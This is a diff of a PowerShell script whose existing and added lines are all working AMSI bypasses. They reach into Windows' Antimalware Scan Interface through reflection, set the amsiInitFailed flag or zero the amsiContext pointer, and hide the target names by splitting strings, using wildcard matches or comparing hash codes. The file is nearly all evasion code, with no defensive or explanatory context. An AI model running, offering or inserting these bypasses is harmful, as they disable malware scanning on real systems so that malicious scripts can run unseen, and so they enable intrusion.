@@ -90,3 +90,14 @@ $f1='am'+'si'+'In'+'it'+'Fa'+'il'+'ed'
 $c=[Ref].Assembly.GetType($p1+$p2)
 $d=$c.GetField($f1,'NonPublic,Static')
 $d.SetValue($null,$true)
+
+
+
+[System.Runtime.InteropServices.Marshal]::Copy([Int32[]]@(0),0,(([Ref].Assembly.GetTypes()|Where-Object{$_.Name-like'*iUtils'})[0].GetFields(40)|Where-Object{$_.Name-like'*ntext'})[0].GetValue($null),1)
+
+
+$a=[Ref].Assembly.GetTypes();
+Foreach($b in $a) {if ($b.Name.GetHashCode() -eq 488161301) {$c=$b}};
+$d=$c.GetFields('NonPublic,Static');
+Foreach($e in $d) {if ($e.Name.GetHashCode() -eq -817967497) {$f=$e}};
+$g=$f.SetValue($null, $true)
